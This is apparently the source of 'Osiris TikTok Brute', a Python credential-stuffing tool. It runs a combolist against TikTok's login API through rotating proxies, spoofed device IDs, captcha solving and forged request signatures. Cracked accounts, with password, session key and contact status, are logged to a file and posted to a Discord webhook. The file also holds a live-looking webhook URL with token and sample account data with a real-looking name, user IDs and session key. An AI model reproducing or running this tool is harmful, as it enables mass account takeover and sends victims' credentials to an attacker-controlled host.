from pickle import FALSE
import threading
import requests
import hashlib
import random
import cursor; cursor.hide()
import time
import json
import os

from pystyle import *
from utils.api import *
from urllib.parse import urlencode

class Bruteforce:
    def __init__(self, device, proxy):
        self.device      = device
        self.proxy       = proxy
        self.checks      = 0
    
    def __solve_captcha(self) -> None:
        return Captcha(
            did = self.device["device_id"],
            iid = self.device["install_id"],
        ).solve_captcha()
    
    def __base_params(self) -> json:
        return urlencode({
            "passport-sdk-version" : 17,
            "os_api"               : 25,
            "device_type"          : "SM-G973N",
            "ssmix"                : "a",
            "manifest_version_code": 160904,
            "dpi"                  : 320,
            "carrier_region"       : "IE",
            "uoo"                  : 0,
            "region"               : "US",
            "carrier_region_v2"    : 310,
            "app_name"             : "musically_go",
            "version_name"         : "16.9.4",
            "timezone_offset"      : 7200,
            "ts"                   : int(time.time()),
            "ab_version"           : "16.9.4",
            "pass-route"           : 1,
            "cpu_support64"        : "false",
            "pass-region"          : 1,
            "storage_type"         : 0,
            "ac2"                  : "wifi",
            "ac"                   : "wifi",
            "app_type"             : "normal",
            "host_abi"             : "armeabi-v7a",
            "channel"              : "googleplay",
            "update_version_code"  : 160904,
            "_rticket"             : int(time.time() * 1000),
            "device_platform"      : "android",
            "iid"                  : self.device["install_id"],
            "build_number"         : "16.9.4",
            "locale"               : "en",
            "op_region"            : "IE",
            "version_code"         : 160904,
            "timezone_name"        : "Africa/Harare",
            "cdid"                 : self.device["cdid"], 
            "openudid"             : self.device["openudid"], 
            "sys_region"           : "US",
            "device_id"            : self.device["device_id"],
            "app_language"         : "en",
            "resolution"           : "900*1600",
            "device_brand"         : "samsung",
            "language"             : "en",
            "os_version"           : "7.1.2",
            "aid"                  : 1340 
        })

    def __base_headers(self, params: str, payload: str) -> dict:
        sig = Utils._sig(
            params = params,
            body   = payload
        )
        
        return {
            "x-ss-stub"             : hashlib.md5(payload.encode()).hexdigest(),
            "accept-encoding"       : "gzip",
            "passport-sdk-version"  : "17",
            "sdk-version"           : "2",
            "x-ss-req-ticket"       : str(int(time.time() * 1000)),
            "x-gorgon"              : sig["X-Gorgon"],
            "x-khronos"             : sig["X-Khronos"],
            "content-type"          : "application/x-www-form-urlencoded; charset=UTF-8",
            "host"                  : "api16-va.tiktokv.com",
            "connection"            : "Keep-Alive",
            "user-agent"            : "okhttp/3.10.0.1"
        }
    
    def __base_payload(self, mode: str, user: str, password: str) -> dict:
        
        return urlencode({
            mode: Utils._xor(user),
            "password": Utils._xor(password),
            "mix_mode": 1,
            "account_sdk_source": "app"
        })

    def login(self, mode: str, username: str, password: str) -> requests.Response:
        for x in range(2):
            # captcha_start = time.time()
            
            if self.__solve_captcha()["code"] == 200:
                try:
                    # print(Utils.sprint("*", "x", "Solved captcha {}{}s{}".format(Col.blue, round(time.time() - captcha_start, 1), Col.reset)))
                    params  = self.__base_params()
                    payload = self.__base_payload(mode, username, password)
                    headers = self.__base_headers(params, payload)
                    
                    return requests.post(
                        url     = (
                            "https://api16-va.tiktokv.com/passport/user/login?"
                                + params
                        ), 
                        data    = payload, 
                        headers = headers, 
                        proxies = {
                            'http' : f'http://{self.proxy}',
                            'https': f'http://{self.proxy}'
                        }
                    )
                except:
                    continue

class Api:
    def __init__(self, device: dict, proxy: str, cookies: dict):
        self.device      = device
        self.proxy       = proxy
        self.cookies     = "; ".join([str(x)+"="+str(y) for x,y in cookies.items()])
    
    def __base_headers(self, params: dict) -> dict:
        sig = Utils._sig(
            params = params
        )
        
        return {
            "accept-encoding"       : "gzip",
            "sdk-version"           : "2",
            # "x-tt-token": "03d2feece922c427e2a16f1a368c31b06e056e5ed1d9dc9879a5dc9181786fddac081c5f9366cc365fc8a8a7af3fb6dfd11290c4a65cb80de625ad7e7be790ff7b11f381084069119cd26173686d3b1f21652990d55391550bd94e26ab8b98621301e-CkBlMDMxOTViYWQ4NTQyMzBhMGNiODA4ZDBmODA3Mjc0ZjA1YjRmM2JhOTMxNjM4MjY0YTY0NWRhYjJmMzY3MmRk-2.0.0",
            "passport-sdk-version"  : "17",
            "x-ss-req-ticket"       : str(int(time.time() * 1000)),
            "cookie"                : self.cookies,
            "x-gorgon"              : sig["X-Gorgon"],
            "x-khronos"             : sig["X-Khronos"],
            "host"                  : "api16-normal-c-useast1a.tiktokv.com",
            "connection"            : "Keep-Alive",
            "user-agent"            : "okhttp/3.10.0.1"
        }
    
    def __base_params(self) -> json:
        
        return urlencode({
            "is_after_login"        : 1,
            "storage_type"          : 0,
            "manifest_version_code" : 160904,
            "_rticket"              : int(time.time() * 1000),
            "current_region"        : "FR",
            "app_language"          : "fr",
            "app_type"              : "normal",
            "iid"                   : self.device["install_id"],
            "channel"               : "googleplay",
            "device_type"           : "SM-G973N",
            "language"              : "fr",
            "cpu_support64"         : "true",
            "host_abi"              : "armeabi-v7a",
            "locale"                : "fr",
            "resolution"            : "1600*900",
            "openudid"              : self.device["openudid"], 
            "update_version_code"   : 160904,
            "ac2"                   : "wifi5g",
            "cdid"                  : self.device["cdid"], 
            "sys_region"            : "FR",
            "os_api"                : 28,
            "uoo"                   : 0,
            "timezone_name"         : "Africa/Harare",
            "dpi"                   : 320,
            "residence"             : "IE",
            "carrier_region"        : "IE",
            "ac"                    : "wifi",
            "device_id"             : self.device["device_id"],
            "pass-route"            : 1,
            "os_version"            : 9,
            "timezone_offset"       : 7200,
            "version_code"          : 160904,
            "carrier_region_v2"     : "208",
            "app_name"              : "musically_go",
            "ab_version"            : "16.9.4",
            "version_name"          : "16.9.4",
            "device_brand"          : "samsung",
            "op_region"             : "IE",
            "ssmix"                 : "a",
            "pass-region"           : 1,
            "device_platform"       : "android",
            "build_number"          : "16.9.4",
            "region"                : "FR",
            "aid"                   : 1340,
            "ts"                    : int(time.time()),
        })
        
    def get_userinfo(self):
        params = self.__base_params()
        
        return requests.get(
            url = (
                "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/profile/self/?"
                    + params
            ),
            headers = self.__base_headers(params),
            proxies = {
                'http' : f'http://{self.proxy}',
                'https': f'http://{self.proxy}'
            }
        )

class ThreadsHandler:
    def __init__(self, combos: list)-> None:
        self.config   = json.loads(open("data/config.json").read())
        self.threads  = self.config["threads"]
        self.mode     = self.config["mode"]
        self.webhook  = self.config["webhook"]["link"] if self.config["webhook"]["enabled"] is True else None
        self.log_file = self.config["logging"]["file"] if self.config["logging"]["enabled"] is True else None
        self.proxies  = open(r"./data/proxies.txt").read().splitlines()
        self.combos   = combos
        self.loggedin = [1381, 2033, 2046]
        self.captcha  = [17, 7]
        self.to_check = len(self.combos)
        self.success  = 0
        self.fails    = 0

    def __login_request(self, username: str, password: str) -> bool and dict:
        try:
            proxy          = random.choice(self.proxies)
            device         = Xlog(proxy).validate_device()
            login_response = Bruteforce(device, proxy).login(self.mode, username, password)
            
            if self.log_file is not None:
                with open(self.log_file, "a") as f:
                    f.write(str(login_response.text) + "\n")
            
            if login_response.json()['data'].get('error_code') is None:
                try:
                    info = Api(device, proxy, {"sessionid": login_response.json()['data']['session_key']}).get_userinfo()
                    # print(info.text)
                    
                    return True, login_response.json(), info.json()
                except Exception:
                    pass
                
                return True, login_response.json(), {}, {}
            
            elif login_response.json()['data'].get('error_code') in self.loggedin:
                return True, login_response.json()
            
            elif login_response.json()['data'].get('error_code') in self.captcha:
                try:
                    proxy          = random.choice(self.proxies)
                    device         = Xlog(proxy).validate_device()
                    login_response = Bruteforce(device, proxy).login(self.mode, username, password)
                    
                    if self.log_file is not None:
                        with open(self.log_file, "a") as f:
                            f.write(str(login_response.text) + "\n")
                    
                    if login_response.json()['data'].get('error_code') is None:
                        try:
                            info = Api(device, proxy, {"sessionid": login_response.json()['data']['session_key']}).get_userinfo()
                            # print(info.text)
                            
                            return True, login_response.json(), info.json()
                        except Exception:
                            pass
                        
                        return True, login_response.json(), {}, {}
                    
                    elif login_response.json()['data'].get('error_code') in self.loggedin:
                        return True, login_response.json(), {}
                    
                    else:
                        return False, {}, {}
                    
                except Exception as e:
                    return False, {}, {}
            
            else:
                return False, {}, {}
            
        except Exception as e:
            return False, {}, {}
    
    def __title_loop(self):
        if os.name == "nt":
            while True:
                os.system(f"title Osiris Brute ^| hits: {self.success} ^| fails: {self.fails} ^| eta: {self.success + self.fails}/{self.to_check}")
                time.sleep(0.5)
                
    def __send_webhook(self, login_data: dict, account_data: dict, email: str, password: str) -> None:
        try:
            _username  = account_data['user']['unique_id']
            _followers = account_data['user']['follower_count']
            _avatar    = account_data['user']['share_info']['share_image_url']['url_list'][0]
            
            requests.post(
                url = self.webhook,
                json = {
                    "content": None,
                    "embeds": [
                        {
                            "title": "Osiris TikTok Brute",
                            "description": f"**profile**: https://tiktok.com/@{_username}\n**password**:  `{password}`\n**email**:  `{email}`\n**Stats: ** flw - `{_followers}` | verified - `{login_data['data']['user_verified']}`",
                            "color":12714239,
                            "image":{
                                "url":"https://s4.gifyu.com/images/zefezfzefzef.gif"
                                },
                            "thumbnail":
                                {
                                    "url": _avatar
                                    }
                        }
                    ],
                "attachments":[]
                }
            )
        except Exception:
            pass
    
    def __brute_account(self, username: str, password: str) -> bool:
        success, login_data, account_data = self.__login_request(username, password)
        # print(login_data)
        if success is True:
            self.success += 1
            try:
                with open("data/hits.txt", "a") as f:
                    f.write(f"@{login_data['data']['name']}| {login_data['data']['session_key']} | {username}:{password} - Followers: n/a - Verified: {login_data['data']['user_verified']} - Email: {login_data['data']['email_collected']} - Phone: {login_data['data']['phone_collected']}\n")
                
                email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
                factor = Utils._factor(email)

                print(Utils.sprint('*', 'Success -', f"{email} {' ' * factor} - Verified: {login_data['data']['user_verified']} - Email: {login_data['data']['email_collected']} - Phone: {login_data['data']['phone_collected']}"))
                
                if self.webhook is not None:
                    if account_data != {}:
                        
                        if self.mode != "email":
                            _email = None
                        else:
                            _email = username
                        self.__send_webhook(login_data, account_data, _email, password)
                
                # if self.webhook is not None:
                #     requests.post(
                #         url     = self.webhook,
                #         data    = json.dumps({
                #             "content": f"bruted - **{username}**:**{password}**"
                #         }),
                #         headers = {"Content-Type": "application/json"}
                #     )
                
            except Exception as e:
                
                email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
                factor = Utils._factor(email)
                
                print(Utils.sprint("x", "Error   -", f"{email} {' ' * factor} | possible brute"))
                
                with open("data/hits.txt") as x:
                    x.write(email)
                    
                if self.webhook is not None:
                    requests.post(
                        url     = self.webhook,
                        data    = json.dumps({
                            "content": f"**{username}** | **{password}**"
                        }),
                        headers = {"Content-Type": "application/json"}
                    )
        
        else:
            self.fails += 1
            email  = f"{Col.blue}{username}{Col.reset}:{Col.blue}{password}{Col.reset}"
            factor = Utils._factor(email)
            print(Utils.sprint("x", "Error   -", f"{email} {' ' * factor} | Incorrect account or password"))
            # print(f"Error   - {username}:{password} | Incorrect account or password")
        
    def main(self):
        threading.Thread(target=self.__title_loop).start()
        
        index = 0
        while index < self.to_check:
            if threading.active_count() < self.threads:
                threading.Thread(
                    target = self.__brute_account, 
                    args = self.combos[index].split(":")
                ).start()
                index += 1
                
    def test(self):
        account_data = {"log_pb":{"impr_id":"2022090114361401022301904326241269"},"user":{"has_twitter_token":False ,"video_gift_status":0 ,"youtube_refresh_token":"","user_rate":1 ,"new_follow_to_reaction_count":0 ,"user_canceled":False ,"follow_status":0 ,"room_id":0 ,"hide_search":False ,"commerce_user_level":0 ,"story_status":0 ,"with_new_goods":False ,"aweme_count":0 ,"social_data":{"social_platform_settings":[{"social_platform":1 ,"sync_status":False ,"onboarding_rec_strategy":4 ,"display_consent_page":True },{"display_consent_page":True ,"social_platform":2 ,"sync_status":False ,"onboarding_rec_strategy":2 }],"enable_permission_pop_up":True },"yt_raw_token":"","profile_tab_type":0 ,"secret":0 ,"age_gate_action":0 ,"is_star":False ,"youtube_channel_id":"","latest_order_time":0 ,"short_id":"0","original_musician":{"music_used_count":0 ,"digg_count":0 ,"music_count":0 },"is_effect_artist":False ,"shield_digg_notice":0 ,"apple_account":0 ,"ins_id":"","live_commerce":False ,"avatar_168x168":{"uri":"musically-maliva-obj/1594805258216454","url_list":["https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.webp?x-expires=1662213600&x-signature=TEZKNh9qub87aMKwWWAR86CCAa0%3D","https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.webp?x-expires=1662213600&x-signature=BYxGgNoImBpvHeZbo6oGxFXT9bM%3D","https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.jpeg?x-expires=1662213600&x-signature=VjRMfe%2BCmRV%2F4y8hbQTD8mMEUS8%3D"]},"video_icon":{"uri":"","url_list":[]},"mplatform_followers_count":0 ,"signature":"","sec_uid":"MS4wLjABAAAAPBy4c8feiKwyyJ9onh3_hK7QMz3b5_0OGBBYBs3IPUT4tAxrA-L2Rn57hnQAnefe","verify_info":"","verification_type":0 ,"is_discipline_member":False ,"download_setting":0 ,"google_account":"","cover_url":[{"url_list":["https://p16-amd-va.tiktokcdn.com/obj/musically-maliva-obj/1612555907887110"],"uri":"musically-maliva-obj/1612555907887110"}],"total_favorited":0 ,"supporting_ngo":{},"twitter_name":"","email":"t***2@gmail.com","has_insights":False ,"bio_permission":{"enable_location":False ,"enable_url":False ,"enable_email":False ,"enable_phone":False },"is_phone_binded":False ,"contacts_sync_status":False ,"shield_follow_notice":0 ,"new_follower_count":0 ,"forward_count":0 ,"youtube_channel_title":"","commerce_user_info":{"has_branded_content_tool":False ,"ad_authorization":False ,"has_promote":False ,"ad_revenue_rits":None ,"has_tcm_entry":False ,"clf_type":0 },"nickname":"anonymus_23095","content_language_already_popup":0 ,"avatar_larger":{"uri":"musically-maliva-obj/1594805258216454","url_list":["https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.webp?x-expires=1662213600&x-signature=pspEByADD%2Fj1%2BFDisDicEYOHz5g%3D","https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.webp?x-expires=1662213600&x-signature=bUJLqkw%2Bo7qFoEpLd3qOnE6hWJI%3D","https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.jpeg?x-expires=1662213600&x-signature=tkhgB3xwfkC95h%2F157imjC6TYAk%3D"]},"dsp_profile":{"collect_count":0 },"bind_phone":"","youtube_last_refresh_time":0 ,"commerce_permissions":{},"unique_id":"anonymus_23095","favoriting_count":0 ,"history_max_follower_count":0 ,"proaccount_update_notification_status":0 ,"notify_minor_private_policy":False ,"category":"","avatar_thumb":{"uri":"musically-maliva-obj/1594805258216454","url_list":["https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.webp?x-expires=1662213600&x-signature=82I3LMOA1WTbLgvZ33%2Fsn4rPJfE%3D","https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.webp?x-expires=1662213600&x-signature=OL1TZrhNrOQFuIlrvgb8sw9a8RU%3D","https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.jpeg?x-expires=1662213600&x-signature=OngWksRD9MYhBfKBpiZOMZv1AMs%3D"]},"age_gate_post_action":0 ,"register_time":1517735714 ,"twitter_id":"","with_commerce_enterprise_tab_entry":False ,"analytics_status":False ,"custom_verify":"","show_image_bubble":False ,"accept_private_policy":False ,"share_info":{"share_weibo_desc":"TikTok : Make Every Second Count","share_desc":"Découvre anonymus_23095 ! #TikTok","share_title":"Rejoins TikTok et découvre ce que je faisais dernièrement !","share_image_url":{"url_list":["https://p16-sign-va.tiktokcdn.com/obj/musically-maliva-obj/1594805258216454?x-expires=1662062400&x-signature=PxV4YvpCefY6Jp8iLVlIo9tHlbc%3D"],"uri":"musically-maliva-obj/1594805258216454"},"bool_persist":1 ,"share_title_myself":"Cette application TikTok est vraiment sympa ! Abonne-toi à moi, @anonymus_23095 sur TikTok, et regarde mes vidéos !","share_title_other":"Cet utilisateur de TikTok est super cool. Abonne-toi à @anonymus_23095 sur TikTok et regarde ses vidéos géniales !","share_url":"https://m.tiktok.com/h5/share/usr/6518501429349454848.html?_d=e3gm5e7j3a0afk&language=fr&sec_uid=MS4wLjABAAAAPBy4c8feiKwyyJ9onh3_hK7QMz3b5_0OGBBYBs3IPUT4tAxrA-L2Rn57hnQAnefe&share_author_id=6518501429349454848&u_code=cla7m38fk8dki5"},"with_item_commerce_entry":False ,"is_email_verified":False ,"user_mode":0 ,"tab_settings":{"private_tab":{"show_private_tab":True ,"private_tab_style":2 }},"follower_count":2 ,"post_default_download_setting":True ,"avatar_medium":{"url_list":["https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.webp?x-expires=1662213600&x-signature=i5gM5%2FHKt7B%2FkwA7ZLD8%2FTToowQ%3D","https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.webp?x-expires=1662213600&x-signature=8F8pP4IDhRH%2FKgzi%2BmepZEw%2FiyE%3D","https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.jpeg?x-expires=1662213600&x-signature=jwYt10rdu0t5Ay%2Ff2i%2Bq%2B509Jig%3D"],"uri":"musically-maliva-obj/1594805258216454"},"enterprise_verify_reason":"","with_commerce_entry":False ,"account_type":0 ,"age_gate_info":{"option_list":None ,"age_gate_buttons":None ,"age_gate_content_hyperlinks":None },"is_pro_account":False ,"tw_expire_time":0 ,"has_email":True ,"follower_status":0 ,"shield_comment_notice":0 ,"can_set_geofencing":False ,"qa_status":0 ,"unique_id_modify_time":0 ,"following_count":33 ,"user_inactive":False ,"tt_mall_tab_related_user_info":{"ttmall_tab_display":True },"account_region":"","login_platform":0 ,"uid":"6518501429349454848","comment_setting":0 ,"avatar_300x300":{"uri":"musically-maliva-obj/1594805258216454","url_list":["https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.webp?x-expires=1662213600&x-signature=D7Ec7MZMqxPe7rUH8LzRT5MYX3k%3D","https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.webp?x-expires=1662213600&x-signature=vtdoqGkBPGbGrGswf3JOHUcKekI%3D","https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.jpeg?x-expires=1662213600&x-signature=cEQyO5indCD024EmO4b2Ga8lyok%3D"]}},"status_code":0 ,"extra":{"now":1662042975000 ,"fatal_item_ids":[],"logid":"2022090114361401022301904326241269"}}
        login_data   = {"data":{"app_id":1340 ,"avatar_url":"https://p16.flipagramcdn.com/6a620b4612a89f244fa8d33100eedb1a-d2c0d1502c59fc5f7e7d87062120ba1ee32521eb_1438055382983-large","cloud_token":"","connects":[],"country_code":0 ,"device_id":0 ,"email":"l***6@gmail.com","email_collected":True ,"expired_uid_list":None ,"has_password":1 ,"is_kids_mode":0 ,"is_only_bind_ins":False ,"mobile":"","name":"Ludy Soriano","need_device_create":0 ,"need_ttwid_migration":0 ,"new_user":0 ,"old_user_id":6532044792623300609 ,"old_user_id_str":"6532044792623300609","phone_collected":False ,"screen_name":"Ludy Soriano","sec_old_user_id":"MS4wLjABAAAA1a-Qp0VrQR5VWfeLUYF6ZmQJv46AYCq7PXQ_jEd-6qTfwiaJL0REz2W_pF3uHKXz","sec_user_id":"MS4wLjABAAAA1a-Qp0VrQR5VWfeLUYF6ZmQJv46AYCq7PXQ_jEd-6qTfwiaJL0REz2W_pF3uHKXz","session_key":"60598c7207efd8e7270bbc0d1ea0bebf","user_device_record_status":0 ,"user_id":6532044792623300609 ,"user_id_str":"6532044792623300609","user_verified":False },"message":"success"}
        
        self.__send_webhook(login_data, account_data, email = None, password = "test123")
        
if __name__ == "__main__":
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Col.purple + Center.XCenter(f""" _____  _______ _____  ______ _____ _______\n|     | |______   |   |_____/   |   |______\n|_____| ______| __|__ |    \_ __|__ ______|""") + Col.reset); print("\n\n")
    
    combos = open(r"./data/combolist.txt").read().splitlines()
    ThreadsHandler(combos).main()
    
    
    quit()
    data = {
        "log_pb":{
            "impr_id":"2022090114361401022301904326241269"
        },
        "user":{
            "has_twitter_token": False,
            "video_gift_status":0,
            "youtube_refresh_token":"",
            "user_rate":1,
            "new_follow_to_reaction_count":0,
            "user_canceled": False,
            "follow_status":0,
            "room_id":0,
            "hide_search": False,
            "commerce_user_level":0,
            "story_status":0,
            "with_new_goods": False,
            "aweme_count":0,
            "social_data":{
                "social_platform_settings":[
                    {
                        "social_platform":1,
                        "sync_status": False,
                        "onboarding_rec_strategy":4,
                        "display_consent_page": True
                    },
                    {
                        "display_consent_page": True,
                        "social_platform":2,
                        "sync_status": False,
                        "onboarding_rec_strategy":2
                    }
                ],
                "enable_permission_pop_up": True
            },
            "yt_raw_token":"",
            "profile_tab_type":0,
            "secret":0,
            "age_gate_action":0,
            "is_star": False,
            "youtube_channel_id":"",
            "latest_order_time":0,
            "short_id":"0",
            "original_musician":{
                "music_used_count":0,
                "digg_count":0,
                "music_count":0
            },
            "is_effect_artist": False,
            "shield_digg_notice":0,
            "apple_account":0,
            "ins_id":"",
            "live_commerce": False,
            "avatar_168x168":{
                "uri":"musically-maliva-obj/1594805258216454",
                "url_list":[
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.webp?x-expires=1662213600&x-signature=TEZKNh9qub87aMKwWWAR86CCAa0%3D",
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.webp?x-expires=1662213600&x-signature=BYxGgNoImBpvHeZbo6oGxFXT9bM%3D",
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_168x168.jpeg?x-expires=1662213600&x-signature=VjRMfe%2BCmRV%2F4y8hbQTD8mMEUS8%3D"
                ]
            },
            "video_icon":{
                "uri":"",
                "url_list":[
                    
                ]
            },
            "mplatform_followers_count":0,
            "signature":"",
            "sec_uid":"MS4wLjABAAAAPBy4c8feiKwyyJ9onh3_hK7QMz3b5_0OGBBYBs3IPUT4tAxrA-L2Rn57hnQAnefe",
            "verify_info":"",
            "verification_type":0,
            "is_discipline_member": False,
            "download_setting":0,
            "google_account":"",
            "cover_url":[
                {
                    "url_list":[
                        "https://p16-amd-va.tiktokcdn.com/obj/musically-maliva-obj/1612555907887110"
                    ],
                    "uri":"musically-maliva-obj/1612555907887110"
                }
            ],
            "total_favorited":0,
            "supporting_ngo":{
                
            },
            "twitter_name":"",
            "email":"t***2@gmail.com",
            "has_insights": False,
            "bio_permission":{
                "enable_location": False,
                "enable_url": False,
                "enable_email": False,
                "enable_phone": False
            },
            "is_phone_binded": False,
            "contacts_sync_status": False,
            "shield_follow_notice":0,
            "new_follower_count":0,
            "forward_count":0,
            "youtube_channel_title":"",
            "commerce_user_info":{
                "has_branded_content_tool": False,
                "ad_authorization": False,
                "has_promote": False,
                "ad_revenue_rits":None,
                "has_tcm_entry": False,
                "clf_type":0
            },
            "nickname":"anonymus_23095",
            "content_language_already_popup":0,
            "avatar_larger":{
                "uri":"musically-maliva-obj/1594805258216454",
                "url_list":[
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.webp?x-expires=1662213600&x-signature=pspEByADD%2Fj1%2BFDisDicEYOHz5g%3D",
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.webp?x-expires=1662213600&x-signature=bUJLqkw%2Bo7qFoEpLd3qOnE6hWJI%3D",
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_1080x1080.jpeg?x-expires=1662213600&x-signature=tkhgB3xwfkC95h%2F157imjC6TYAk%3D"
                ]
            },
            "dsp_profile":{
                "collect_count":0
            },
            "bind_phone":"",
            "youtube_last_refresh_time":0,
            "commerce_permissions":{
                
            },
            "unique_id":"anonymus_23095",
            "favoriting_count":0,
            "history_max_follower_count":0,
            "proaccount_update_notification_status":0,
            "notify_minor_private_policy": False,
            "category":"",
            "avatar_thumb":{
                "uri":"musically-maliva-obj/1594805258216454",
                "url_list":[
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.webp?x-expires=1662213600&x-signature=82I3LMOA1WTbLgvZ33%2Fsn4rPJfE%3D",
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.webp?x-expires=1662213600&x-signature=OL1TZrhNrOQFuIlrvgb8sw9a8RU%3D",
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_100x100.jpeg?x-expires=1662213600&x-signature=OngWksRD9MYhBfKBpiZOMZv1AMs%3D"
                ]
            },
            "age_gate_post_action":0,
            "register_time":1517735714,
            "twitter_id":"",
            "with_commerce_enterprise_tab_entry": False,
            "analytics_status": False,
            "custom_verify":"",
            "show_image_bubble": False,
            "accept_private_policy": False,
            "share_info":{
                "share_weibo_desc":"TikTok : Make Every Second Count",
                "share_desc":"Découvre anonymus_23095 ! #TikTok",
                "share_title":"Rejoins TikTok et découvre ce que je faisais dernièrement !",
                "share_image_url":{
                    "url_list":[
                        "https://p16-sign-va.tiktokcdn.com/obj/musically-maliva-obj/1594805258216454?x-expires=1662062400&x-signature=PxV4YvpCefY6Jp8iLVlIo9tHlbc%3D"
                    ],
                    "uri":"musically-maliva-obj/1594805258216454"
                },
                "bool_persist":1,
                "share_title_myself":"Cette application TikTok est vraiment sympa ! Abonne-toi à moi, @anonymus_23095 sur TikTok, et regarde mes vidéos !",
                "share_title_other":"Cet utilisateur de TikTok est super cool. Abonne-toi à @anonymus_23095 sur TikTok et regarde ses vidéos géniales !",
                "share_url":"https://m.tiktok.com/h5/share/usr/6518501429349454848.html?_d=e3gm5e7j3a0afk&language=fr&sec_uid=MS4wLjABAAAAPBy4c8feiKwyyJ9onh3_hK7QMz3b5_0OGBBYBs3IPUT4tAxrA-L2Rn57hnQAnefe&share_author_id=6518501429349454848&u_code=cla7m38fk8dki5"
            },
            "with_item_commerce_entry": False,
            "is_email_verified": False,
            "user_mode":0,
            "tab_settings":{
                "private_tab":{
                    "show_private_tab": True,
                    "private_tab_style":2
                }
            },
            "follower_count":2,
            "post_default_download_setting": True,
            "avatar_medium":{
                "url_list":[
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.webp?x-expires=1662213600&x-signature=i5gM5%2FHKt7B%2FkwA7ZLD8%2FTToowQ%3D",
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.webp?x-expires=1662213600&x-signature=8F8pP4IDhRH%2FKgzi%2BmepZEw%2FiyE%3D",
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_720x720.jpeg?x-expires=1662213600&x-signature=jwYt10rdu0t5Ay%2Ff2i%2Bq%2B509Jig%3D"
                ],
                "uri":"musically-maliva-obj/1594805258216454"
            },
            "enterprise_verify_reason":"",
            "with_commerce_entry": False,
            "account_type":0,
            "age_gate_info":{
                "option_list": None,
                "age_gate_buttons": None,
                "age_gate_content_hyperlinks": None
            },
            "is_pro_account": False,
            "tw_expire_time":0,
            "has_email": True,
            "follower_status":0,
            "shield_comment_notice":0,
            "can_set_geofencing": False,
            "qa_status":0,
            "unique_id_modify_time":0,
            "following_count":33,
            "user_inactive": False,
            "tt_mall_tab_related_user_info":{
                "ttmall_tab_display": True
            },
            "account_region":"",
            "login_platform":0,
            "uid":"6518501429349454848",
            "comment_setting":0,
            "avatar_300x300":{
                "uri":"musically-maliva-obj/1594805258216454",
                "url_list":[
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.webp?x-expires=1662213600&x-signature=D7Ec7MZMqxPe7rUH8LzRT5MYX3k%3D",
                    "https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.webp?x-expires=1662213600&x-signature=vtdoqGkBPGbGrGswf3JOHUcKekI%3D",
                    "https://p77-sign-va.tiktokcdn.com/musically-maliva-obj/1594805258216454~c5_300x300.jpeg?x-expires=1662213600&x-signature=cEQyO5indCD024EmO4b2Ga8lyok%3D"
                ]
            }
        },
        "status_code":0,
        "extra":{
            "now":1662042975000,
            "fatal_item_ids":[
                
            ],
            "logid":"2022090114361401022301904326241269"
        }
    }
    
    email = "fzefzefzgzeg@gmail.com"
    password   = "test123"
    _username  = data['user']['unique_id']
    _followers = data['user']['follower_count']
    _avatar    = data['user']['share_info']['share_image_url']['url_list'][0]
    _combo     = f"{_username}:{password}"
    _email_collected  = True
    _phone_collected  = False
    _verified = False
    
    print(Utils.sprint('*', 'Success -', f"{Col.blue}@{_username}{Col.reset} - Followers: {_followers}"))
    print(Utils.sprint("x", "Error   -", f"{email} | Incorrect account or password"))

    password = "xxxxx"
    
    r = requests.post(
        url = "https://discord.com/api/webhooks/997536111733784767/RNg1Mh2fgcjOS87W0IvVy8ItwAyHWxqwybBSDOQ3dqTjDeFFPhcHSMZ1Uy6nkn8ceb65",
        json = {
            "content":None,
            "embeds":[
                {
                    "title": "Osiris TikTok Brute",
                    "description": f"**profile**: https://tiktok.com/@{_username}\n**password**:  `{password}`\n**email**:  `{email}`\n**Stats: ** flw - `{_followers}` | verified - `{True}`",
                    "color":12714239,
                    "image":{
                        "url":"https://s4.gifyu.com/images/zefezfzefzef.gif"
                        },
                    "thumbnail":
                        {
                            "url": _avatar
                            }
                }
            ],
        "attachments":[]
        }
    )
    
    print(r.text)
    